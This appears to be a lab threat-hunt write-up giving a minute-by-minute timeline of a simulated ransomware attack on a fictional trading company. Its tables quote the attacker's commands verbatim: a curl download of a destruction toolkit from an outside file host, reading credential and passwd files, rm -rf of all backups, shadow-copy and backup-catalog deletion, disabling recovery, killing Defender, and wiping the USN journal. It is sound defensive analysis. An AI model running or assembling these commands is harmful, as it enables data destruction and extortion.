# AZUKI BREACH Threat Hunt - Part 4: Attack Timeline

This document provides a detailed chronological breakdown of the JADE SPIDER ransomware deployment phase at Azuki Import/Export Trading Co.

---

## Timeline Overview

| Date | Time Range | Activity |
|------|------------|----------|
| November 24, 2025 | 2:14 PM - 2:16 PM | Initial backup server reconnaissance |
| November 25, 2025 | 5:31 AM - 6:10 AM | Ransomware preparation and deployment |
| November 27, 2025 | 5:48 AM | Encryption completed |

---

## Detailed Timeline

### November 24, 2025 - Initial Backup Server Reconnaissance

| Timestamp (UTC) | System | Account | Action | Details |
|-----------------|--------|---------|--------|---------|
| 2:14:14 PM | azuki-backupsrv | backup-admin | Credential Access | `cat /backups/configs/all-credentials.txt` |
| 2:14:14 PM | azuki-backupsrv | backup-admin | Discovery | `cat /backups/config-backups/network-config.txt` |
| 2:16:06 PM | azuki-backupsrv | backup-admin | Discovery | `find /backups -name *.tar.gz` |
| 2:16:08 PM | azuki-backupsrv | backup-admin | Discovery | `cat /etc/passwd` |
| 2:16:08 PM | azuki-backupsrv | backup-admin | Discovery | `cat /etc/crontab` |

**Summary:** The attacker accessed the backup server and performed initial reconnaissance, discovering credential files and enumerating backup locations.

---

### November 25, 2025 - Main Attack Phase

#### Phase 1: Security Process Termination (5:31 AM)

| Timestamp (UTC) | System | Account | Action | Details |
|-----------------|--------|---------|--------|---------|
| 5:31:11 AM | azuki-adminpc | yuki.tanaka | Defense Evasion | `"taskkill.exe" /F /IM MsMpEng.exe` |
| 5:31:11 AM | azuki-adminpc | yuki.tanaka | Defense Evasion | `"taskkill.exe" /F /IM MpCmdRun.exe` |
| 5:31:13 AM | azuki-adminpc | yuki.tanaka | Defense Evasion | `"taskkill.exe" /F /IM NisSrv.exe` |

**Summary:** Windows Defender processes terminated on azuki-adminpc.

---

#### Phase 2: Meterpreter Persistence (5:36 AM)

| Timestamp (UTC) | System | Account | Action | Details |
|-----------------|--------|---------|--------|---------|
| 5:36:33 AM | azuki-adminpc | yuki.tanaka | Persistence | Registry Run key: `SystemHealthMonitor` → `meterpreter.exe` |

**Summary:** Meterpreter C2 beacon persistence established.

---

#### Phase 3: Lateral Movement to Backup Server (5:39 AM)

| Timestamp (UTC) | System | Account | Action | Details |
|-----------------|--------|---------|--------|---------|
| 5:39:10 AM | azuki-adminpc | yuki.tanaka | Lateral Movement | `"ssh.exe" backup-admin@10.1.0.189` |
| 5:39:41 AM | azuki-backupsrv | backup-admin | Discovery | `ls --color=auto -la` |
| 5:41:43 AM | azuki-backupsrv | backup-admin | Discovery | `ls --color=auto -la /var/backups/` |
| 5:42:39 AM | azuki-backupsrv | backup-admin | Discovery | `find / -name *backup* -type d` |

**Summary:** SSH connection to backup server and directory enumeration.

---

#### Phase 4: Backup Server Compromise (5:45 AM - 5:47 AM)

| Timestamp (UTC) | System | Account | Action | Details |
|-----------------|--------|---------|--------|---------|
| 5:45:34 AM | azuki-backupsrv | root | Tool Download | `curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z` |
| 5:45:37 AM | azuki-backupsrv | root | Discovery | `ls --color=auto` |
| 5:47:02.651 AM | azuki-backupsrv | root | Data Destruction | `rm -rf /var/backups/...` (system backups) |
| 5:47:02.660 AM | azuki-backupsrv | root | Data Destruction | `rm -rf /backups/...` (ALL corporate backups) |
| 5:47:02.682 AM | azuki-backupsrv | root | Data Destruction | `rm -rf /backups/config-backups/*` |
| 5:47:02.685 AM | azuki-backupsrv | root | Data Destruction | `rm -rf /backups/database-backups/*` |
| 5:47:03.652 AM | azuki-backupsrv | root | Service Stop | `systemctl stop cron` |
| 5:47:03.679 AM | azuki-backupsrv | root | Service Disable | `systemctl disable cron` |
| 5:47:51 AM | azuki-backupsrv | root | Discovery | `ls --color=auto -la /backups/` (verify deletion) |

**Summary:** Downloaded destruction toolkit, deleted ALL backup directories, disabled cron service.

---

#### Phase 5: Windows Recovery Inhibition - First Wave (5:58 AM - 6:00 AM)

| Timestamp (UTC) | System | Account | Action | Details |
|-----------------|--------|---------|--------|---------|
| 5:58:35 AM | azuki-adminpc | yuki.tanaka | Tool Prep | `"PsExec64.exe" /accepteula` |
| 5:58:55 AM | azuki-adminpc | yuki.tanaka | Recovery Inhibition | `"vssadmin.exe" delete shadows /all /quiet` |
| 5:59:04 AM | azuki-adminpc | yuki.tanaka | Recovery Inhibition | `"bcdedit.exe" /set ... recoveryenabled No` |
| 5:59:56 AM | azuki-adminpc | yuki.tanaka | Recovery Inhibition | `"vssadmin.exe" resize shadowstorage /maxsize=401MB` |
| 6:00:11 AM | azuki-adminpc | yuki.tanaka | Verification | `"vssadmin.exe" list shadows` |

**Summary:** Shadow copies deleted, recovery disabled, shadow storage limited on azuki-adminpc.

---

#### Phase 6: Ransomware Deployment via PsExec (6:03 AM - 6:05 AM)

| Timestamp (UTC) | System | Account | Action | Details |
|-----------------|--------|---------|--------|---------|
| 6:03:47 AM | azuki-adminpc | yuki.tanaka | Lateral Movement | PsExec to 10.1.0.102 (azuki-logistics) with silentlynx.exe |
| 6:04:40 AM | azuki-adminpc | yuki.tanaka | Lateral Movement | PsExec to 10.1.0.188 (azuki-fileserver01) with silentlynx.exe |
| 6:04:53 AM | azuki-adminpc | yuki.tanaka | Service Stop | `"net" stop VSS /y` |
| 6:04:55 AM | azuki-adminpc | yuki.tanaka | Service Stop | `"net" stop wscsvc /y` |
| 6:04:56 AM | azuki-adminpc | yuki.tanaka | Service Stop | `"net" stop WdNisSvc /y` |
| 6:04:57 AM | azuki-adminpc | yuki.tanaka | Process Kill | `"taskkill" /F /IM sqlservr.exe` |
| 6:04:57-59 AM | azuki-adminpc | yuki.tanaka | Process Kill | Multiple database/Office processes killed |
| 6:04:59 AM | azuki-adminpc | yuki.tanaka | Recovery Inhibition | `"vssadmin" delete shadows /all /quiet` |
| 6:04:59 AM | azuki-adminpc | yuki.tanaka | Recovery Inhibition | `"bcdedit" /set {default} recoveryenabled No` |
| 6:04:59 AM | azuki-adminpc | yuki.tanaka | Recovery Inhibition | `"wbadmin" delete catalog -quiet` |
| 6:05:00 AM | azuki-adminpc | yuki.tanaka | Recovery Inhibition | `"vssadmin" resize shadowstorage /maxsize=401MB` |
| 6:05:01 AM | azuki-adminpc | yuki.tanaka | Persistence | Registry Run key: `WindowsSecurityHealth` → `silentlynx.exe` |
| 6:05:01 AM | azuki-adminpc | yuki.tanaka | Persistence | Scheduled task: `SecurityHealthService` |
| 6:05:01 AM | azuki-adminpc | - | Impact | Ransom note: `SILENTLYNX_README.txt` (Desktop, Documents) |
| 6:05:46 AM | azuki-adminpc | yuki.tanaka | Lateral Movement | PsExec to 10.1.0.204 (azuki-sl) with silentlynx.exe |

**Summary:** Deployed silentlynx.exe to all Windows systems, stopped services, killed processes, deleted recovery options, established persistence, dropped ransom notes.

---

#### Phase 7: azuki-sl Ransomware Activation (6:07 AM)

| Timestamp (UTC) | System | Account | Action | Details |
|-----------------|--------|---------|--------|---------|
| 6:07:03 AM | azuki-sl | kenji.sato | Service Stop | `"net" stop VSS /y` |
| 6:07:03 AM | azuki-sl | kenji.sato | Service Stop | `"net" stop wbengine /y` |
| 6:07:04 AM | azuki-sl | kenji.sato | Service Stop | `"net" stop SDRSVC /y` |
| 6:07:05 AM | azuki-sl | kenji.sato | Service Stop | `"net" stop WinDefend /y` |
| 6:07:05 AM | azuki-sl | kenji.sato | Service Stop | `"net" stop wscsvc /y` |
| 6:07:06 AM | azuki-sl | kenji.sato | Service Stop | `"net" stop WdNisSvc /y` |
| 6:07:07 AM | azuki-sl | kenji.sato | Process Kill | Multiple database/Office processes killed |
| 6:07:08 AM | azuki-sl | kenji.sato | Recovery Inhibition | `"vssadmin" delete shadows /all /quiet` |
| 6:07:08 AM | azuki-sl | kenji.sato | Recovery Inhibition | `"wmic" shadowcopy delete /nointeractive` |
| 6:07:08 AM | azuki-sl | kenji.sato | Recovery Inhibition | `"bcdedit" /set {default} recoveryenabled No` |
| 6:07:09 AM | azuki-sl | kenji.sato | Recovery Inhibition | `"wbadmin" delete catalog -quiet` |
| 6:07:09 AM | azuki-sl | kenji.sato | Recovery Inhibition | `"vssadmin" resize shadowstorage /maxsize=401MB` |
| 6:07:09 AM | azuki-sl | kenji.sato | Persistence | Registry Run key: `WindowsSecurityHealth` → `silentlynx.exe` |
| 6:07:09 AM | azuki-sl | kenji.sato | Persistence | Scheduled task: `SecurityHealthService` |
| 6:07:09 AM | azuki-sl | - | Impact | Ransom note: `SILENTLYNX_README.txt` (Desktop, Documents) |

**Summary:** Full ransomware preparation sequence executed on azuki-sl.

---

#### Phase 8: Anti-Forensics (6:10 AM)

| Timestamp (UTC) | System | Account | Action | Details |
|-----------------|--------|---------|--------|---------|
| 6:10:04 AM | azuki-adminpc | yuki.tanaka | Anti-Forensics | `"fsutil.exe" usn deletejournal /D C:` |

**Summary:** NTFS USN Journal deleted to hinder forensic analysis.

---

### November 27, 2025 - Encryption Completed

| Timestamp (UTC) | System | Account | Action | Details |
|-----------------|--------|---------|--------|---------|
| 5:48:14 AM | All systems | - | Impact | Encryption completed - 847,293 files encrypted |

**Summary:** Ransomware encryption finalized across all systems.

---

## Visual Timeline

```
November 24, 2025
==================
14:14 ─────────────────────────────────────────────────────────────────────────
      │ [BACKUP SERVER RECON]
      │ ├─ Credential access: all-credentials.txt
      │ ├─ Discovery: find backups
      │ └─ Discovery: /etc/passwd, /etc/crontab
14:16 ─────────────────────────────────────────────────────────────────────────


November 25, 2025
==================
05:31 ─────────────────────────────────────────────────────────────────────────
      │ [SECURITY PROCESS TERMINATION]
      │ └─ Kill Defender processes (MsMpEng, MpCmdRun, NisSrv)
      │
05:36 ─────────────────────────────────────────────────────────────────────────
      │ [METERPRETER PERSISTENCE]
      │ └─ Registry: SystemHealthMonitor
      │
05:39 ─────────────────────────────────────────────────────────────────────────
      │ [LATERAL MOVEMENT - BACKUP SERVER]
      │ ├─ SSH to backup-admin@10.1.0.189
      │ └─ Directory enumeration
      │
05:45 ─────────────────────────────────────────────────────────────────────────
      │ [BACKUP DESTRUCTION]
      │ ├─ Download destroy.7z
      │ ├─ rm -rf /backups/* (ALL BACKUPS DELETED)
      │ ├─ systemctl stop cron
      │ └─ systemctl disable cron
      │
05:58 ─────────────────────────────────────────────────────────────────────────
      │ [RECOVERY INHIBITION - WAVE 1]
      │ ├─ PsExec accepteula
      │ ├─ vssadmin delete shadows
      │ ├─ bcdedit recoveryenabled No
      │ └─ vssadmin resize shadowstorage
      │
06:03 ─────────────────────────────────────────────────────────────────────────
      │ [PSEXEC DEPLOYMENT]
      │ ├─ 06:03:47 → 10.1.0.102 (azuki-logistics)
      │ ├─ 06:04:40 → 10.1.0.188 (azuki-fileserver01)
      │ └─ 06:05:46 → 10.1.0.204 (azuki-sl)
      │
06:04 ─────────────────────────────────────────────────────────────────────────
      │ [AZUKI-ADMINPC - RANSOMWARE PREP]
      │ ├─ Stop services (VSS, wscsvc, WdNisSvc)
      │ ├─ Kill processes (SQL, Office apps)
      │ ├─ Delete shadows, catalog
      │ ├─ Disable recovery
      │ ├─ Persistence (Registry + Task)
      │ └─ Drop ransom note
      │
06:07 ─────────────────────────────────────────────────────────────────────────
      │ [AZUKI-SL - RANSOMWARE PREP]
      │ ├─ Stop services (VSS, wbengine, WinDefend, etc.)
      │ ├─ Kill processes (SQL, Office apps)
      │ ├─ Delete shadows (vssadmin + wmic)
      │ ├─ Delete catalog, disable recovery
      │ ├─ Persistence (Registry + Task)
      │ └─ Drop ransom note
      │
06:10 ─────────────────────────────────────────────────────────────────────────
      │ [ANTI-FORENSICS]
      │ └─ fsutil usn deletejournal /D C:
      │


November 27, 2025
==================
05:48 ─────────────────────────────────────────────────────────────────────────
      │ [ENCRYPTION COMPLETE]
      │ ├─ 847,293 files encrypted
      │ ├─ 847.2 GB data encrypted
      │ └─ .lynx extension applied
      │
```

---

## Attack Phase Summary

| Phase | Time | Duration | Key Activity |
|-------|------|----------|--------------|
| Recon | Nov 24, 2:14 PM | 2 min | Backup server reconnaissance |
| Prep | Nov 25, 5:31 AM | 5 min | Defender processes killed |
| Persistence | Nov 25, 5:36 AM | 1 min | Meterpreter persistence |
| Lateral Movement | Nov 25, 5:39 AM | 8 min | SSH to backup server |
| Destruction | Nov 25, 5:45 AM | 3 min | All backups destroyed |
| Recovery Inhibition | Nov 25, 5:58 AM | 12 min | Shadow copies, recovery disabled |
| Deployment | Nov 25, 6:03 AM | 3 min | PsExec to all systems |
| Ransomware Prep | Nov 25, 6:04-6:07 AM | 4 min | Services stopped, processes killed |
| Anti-Forensics | Nov 25, 6:10 AM | 1 min | USN journal deleted |
| Encryption | Nov 27, 5:48 AM | Unknown | Full encryption completed |

**Total Active Attack Time (Nov 25):** ~39 minutes

---

## Cross-Part Timeline Comparison

| Part | Date | Duration | Target | Key Activity |
|------|------|----------|--------|--------------|
| Part 1 | Nov 19 | ~35 min | azuki-sl | Initial access, persistence |
| Part 2 | Nov 22 | ~2 hours | azuki-fileserver01 | File server compromise, exfil |
| Part 3 | Nov 25 | ~2 hours | azuki-adminpc | CEO PC, credential theft |
| Part 4 | Nov 25-27 | ~39 min active | All systems | Backup destruction, ransomware |

---

## Complete Intrusion Timeline

```
Nov 19 ──── Part 1: Initial Access (azuki-sl)
    │
    │       [3 days]
    │
Nov 22 ──── Part 2: File Server Compromise (azuki-fileserver01)
    │
    │       [3 days]
    │
Nov 25 ──── Part 3: CEO PC Compromise (azuki-adminpc)
    │       Part 4: Backup Destruction + Ransomware Deployment
    │
    │       [2 days - encryption in progress]
    │
Nov 27 ──── Encryption Complete - Ransom Notes Discovered
```

**Total Dwell Time:** 8 days (Nov 19 - Nov 27)

---

## References

- [Part 4 README](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/part-4-dead-in-the-water/README.md)
- [Part 4 IOCs](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/part-4-dead-in-the-water/docs/indicators-of-compromise.md)
- [Part 1 Timeline](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/part-1-port-of-entry/docs/chronological-timeline.md)
- [Part 2 Timeline](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/part-2-cargo-hold/docs/chronological-timeline.md)
- [Part 3 Timeline](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/part-3-bridge-takeover/docs/chronological-timeline.md)
